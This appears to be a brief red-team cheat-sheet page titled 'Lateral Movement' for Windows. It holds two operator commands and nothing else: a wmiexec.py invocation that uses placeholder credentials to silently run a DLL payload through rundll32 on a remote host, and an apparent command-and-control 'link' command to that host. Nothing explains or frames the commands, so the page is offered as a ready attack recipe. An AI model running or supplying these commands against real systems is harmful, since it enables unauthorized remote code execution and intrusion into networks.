---
title: Lateral Movement
category: windows
weight: -1
---

```sh
wmiexec.py "User":"Password"@10.1.1.1 'C:\\Windows\\System32\\rundll32.exe C:\\citswork.dll,AdminTest' -silentcommand -debug
link 10.1.1.1 xxxx
```